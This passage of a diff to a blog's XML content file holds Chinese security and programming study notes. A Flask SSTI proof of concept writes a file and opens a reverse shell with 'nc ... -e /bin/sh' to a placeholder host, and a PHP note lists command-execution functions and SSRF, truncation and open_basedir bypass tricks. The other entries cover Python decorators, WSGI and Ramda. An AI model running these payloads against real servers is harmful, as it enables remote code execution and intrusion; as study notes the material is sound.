+<p>后来发现dalao写的更清楚..<br>原理和探索过程看dalao的blog<br><a href="http://klaus.link/2017/Flask_SSTI/" target="_blank" rel="external">http://klaus.link/2017/Flask_SSTI/</a></p>
+<p>我就记录一下poc</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/tmp/evil'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'from os import system%0aSHELL = system'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span class="token operator">//</span>写文件
+<span class="token punctuation">{</span><span class="token punctuation">{</span> config<span class="token punctuation">.</span>from_pyfile<span class="token punctuation">(</span><span class="token string">'/tmp/evil'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span class="token operator">//</span>加载system
+<span class="token punctuation">{</span><span class="token punctuation">{</span> config<span class="token punctuation">[</span><span class="token string">'SHELL'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'nc xxxx xx -e /bin/sh'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span class="token operator">//</span>执行命令反弹SHELL
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+]]></content>
+      
+        <categories>
+            
+            <category> 学习 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> python </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[php | trick 积累]]></title>
+      <url>/2018/01/05/php-trick-%E7%A7%AF%E7%B4%AF/</url>
+      <content type="html"><![CDATA[<h3 id="命令相关函数"><a href="#命令相关函数" class="headerlink" title="命令相关函数"></a>命令相关函数</h3><p>exec()<br>passthru()<br>shell_exec()<br>system()<br>pcntl_exec()<br>pcntl_fork()<br>proc_open()<br>popen()</p>
+<p>即使命令执行函数都被禁止了, 也可以通过<code>glob</code>遍历一下目录</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token string">"./*"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> 
+<span class="token punctuation">{</span>  
+    <span class="token keyword">echo</span> <span class="token variable">$item</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span> 
+<span class="token punctuation">}</span><span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>phpjiami <a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html</a><br>php_screw  <a href="http://blog.csdn.net/water_cow/article/details/41872091" target="_blank" rel="external">http://blog.csdn.net/water_cow/article/details/41872091</a></p>
+<h3 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h3><p><a href="http://www.mxny.org/post/ctf/2016-11-10" target="_blank" rel="external">http://www.mxny.org/post/ctf/2016-11-10</a><br><a href="http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html" target="_blank" rel="external">http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html</a><br>33c3 list0r 最后可以用<code>parse_url</code>和<code>curl</code>解析的不同绕过ssrf, 当然这题也可以DNS rebinding</p>
+<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>用<code>file_get_contents</code>和<code>file_put_contents</code>是最方便的</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"xxx.xxx"</span>
+
+<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
+
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="二进制不安全函数"><a href="#二进制不安全函数" class="headerlink" title="二进制不安全函数"></a>二进制不安全函数</h3><p>远古php存在的经典的函数ereg系列(5.3之前?)<br><code>eregi()</code>和<code>ereg()</code>, 很久之前废除了, 存在00截断问题<br>应该是废除ereg换成preg系列函数的时候, include也不能00截断了<br>在网上看到一个其他的截断姿势: <a href="https://www.cnblogs.com/milantgh/p/5293628.html" target="_blank" rel="external">https://www.cnblogs.com/milantgh/p/5293628.html</a></p>
+<h3 id="python-urllib-header注入"><a href="#python-urllib-header注入" class="headerlink" title="python urllib header注入"></a>python urllib header注入</h3><p>传说中的<code>CVE-2016-5699</code>: <a href="http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html" target="_blank" rel="external">http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html</a></p>
+<p>在Redis上的利用: <a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/106</a></p>
+<h3 id="后缀"><a href="#后缀" class="headerlink" title="后缀"></a>后缀</h3><p>php,php3,php4,php5,phtml</p>
+<h3 id="绕过open-base"><a href="#绕过open-base" class="headerlink" title="绕过open_base"></a>绕过open_base</h3><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="external">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> trick </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> php </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[python | 装饰器]]></title>
+      <url>/2018/01/04/python-%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
+      <content type="html"><![CDATA[<p><a href="http://python.jobbole.com/82344/" target="_blank" rel="external">http://python.jobbole.com/82344/</a><br><a href="https://www.zhihu.com/question/26930016" target="_blank" rel="external">https://www.zhihu.com/question/26930016</a><br><a href="http://python.jobbole.com/85056/" target="_blank" rel="external">http://python.jobbole.com/85056/</a></p>
+<p>制作一个记录</p>
+<p>顺带搭车理解<code>*arg, **kwargs</code>: <a href="http://blog.csdn.net/callinglove/article/details/45483097" target="_blank" rel="external">http://blog.csdn.net/callinglove/article/details/45483097</a></p>
+<p>所以 <code>*arg</code> 相当于一个<code>可变长参数</code><br><code>**kwargs</code> 相当于<code>可变长参数键值对版</code> (==!wo yy de)</p>
+<p>我还是感觉python面向对象很闹心==还是我太菜了…</p>
+<blockquote>
+<p>闭包 装饰器 生成器 </p>
+</blockquote>
+]]></content>
+      
+        <categories>
+            
+            <category> 学习 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[python | WSGI学习]]></title>
       <url>/2018/01/04/python-WSGI%E5%AD%A6%E4%B9%A0/</url>
-      <content type="html"><![CDATA[<p><a href="http://python.jobbole.com/88653/" target="_blank" rel="external">http://python.jobbole.com/88653/</a><br><a href="http://python.jobbole.com/87502/" target="_blank" rel="external">http://python.jobbole.com/87502/</a></p>
-<p>这两篇讲的很好了，就做个收集..</p>
+      <content type="html"><![CDATA[<p><a href="http://python.jobbole.com/88653/" target="_blank" rel="external">http://python.jobbole.com/88653/</a></p>
+<p>文章讲的很好了</p>
+<p>WSGI 是 python 定义的</p>
 <p>WSGI就是规定了server和application如何通信的协议(从Server端看)</p>
 <p>这里server不是我们通常说的B/S和C/S里的server</p>
 <p>可以认为是这样子(但愿我理解的对)</p>
@@ -16,7 +424,23 @@
 +========+                     +=========================+
 +B  or  C+                     |我们说的B/S或者C/S里面的S|
 +--------+                     +-------------------------+
-</code></pre>]]></content>
+</code></pre><p>常见的Django, Flask 应该算是这里的app<br>但他们里面也有简单的Server(WSGIRefServer的封装应该是?)实现，所以自己也可以跑起来，生产环境则会搭配一些Server, 比如bjoern, gunicorn, uWSGI<br>所以这些web框架，一般会有几种不同的启动方式?</p>
+<blockquote>
+<p>Bottle, 只有一个文件的web框架</p>
+<p>我怕是个傻子，才知道ipython的存在…</p>
+</blockquote>
+<p>这里有个turorial: <a href="http://wsgi.tutorial.codepoint.net/" target="_blank" rel="external">http://wsgi.tutorial.codepoint.net/</a></p>
+<p>app端大致的定义</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">app</span><span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    start_response<span class="token punctuation">(</span>status<span class="token punctuation">,</span> headers<span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token keyword">return</span> iterator
+
+    <span class="token comment" spellcheck="true"># environ, start_response由Server调用app时候传入...放在js里大概是就是叫回调函数?</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>另外有一篇为什么要用ORM的: <a href="https://stackoverflow.com/questions/398134/what-are-the-advantages-of-using-an-orm" target="_blank" rel="external">https://stackoverflow.com/questions/398134/what-are-the-advantages-of-using-an-orm</a></p>
+]]></content>
       
         <categories>
             
@@ -7567,9 +7991,9 @@ newObj<span class="token punctuation">.</span>createCallback <span class="token 
         
         <tags>
             
-            <tag> request </tag>
-            
             <tag> php </tag>
+            
+            <tag> request </tag>
             
         </tags>
         
@@ -7809,6 +8233,21 @@ function doSomething2(){
     
     <entry>
       <title><![CDATA[ramda]]></title>
+      <url>/2017/05/23/ramda/</url>
+      <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>今天在知乎上看到了这个<code>Ramda</code><br>是一个函数式的.额,然后就想到了underscore</p>
+<p>搜了一下看到了<br>官网<code>http://ramdajs.com/</code>, github 8k star<br>所有的方法都支持Curry</p>
+<p>哦还搜到了一篇文章<br><a href="http://www.ruanyifeng.com/blog/2017/03/ramda.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2017/03/ramda.html</a></p>
+<p>还有一本gitbook是js函数式<br><a href="https://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details" target="_blank" rel="external">https://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details</a></p>
+<p>想有时间学一下,先mark一下</p>
+<p>算了不过了,mark啥,现在就学学呗</p>
+<p>等我先写完,,,那个a的href和onclick就学这个</p>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[ramda]]></title>
       <url>/2017/05/23/Ramda/</url>
       <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>今天在知乎上看到了这个<code>Ramda</code><br>是一个函数式的.额,然后就想到了underscore</p>
 <p>搜了一下看到了<br>官网<code>http://ramdajs.com/</code>, github 8k star<br>所有的方法都支持Curry</p>
@@ -7867,21 +8306,6 @@ R<span class="token punctuation">.</span><span class="token function">test</span
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>确实很语义化,很酷炫,,,</p>
 <p>后面还有个很长的例子,,,很酷炫</p>
-]]></content>
-      
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[ramda]]></title>
-      <url>/2017/05/23/ramda/</url>
-      <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>今天在知乎上看到了这个<code>Ramda</code><br>是一个函数式的.额,然后就想到了underscore</p>
-<p>搜了一下看到了<br>官网<code>http://ramdajs.com/</code>, github 8k star<br>所有的方法都支持Curry</p>
-<p>哦还搜到了一篇文章<br><a href="http://www.ruanyifeng.com/blog/2017/03/ramda.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2017/03/ramda.html</a></p>
-<p>还有一本gitbook是js函数式<br><a href="https://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details" target="_blank" rel="external">https://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details</a></p>
-<p>想有时间学一下,先mark一下</p>
-<p>算了不过了,mark啥,现在就学学呗</p>
-<p>等我先写完,,,那个a的href和onclick就学这个</p>
 ]]></content>
       
         
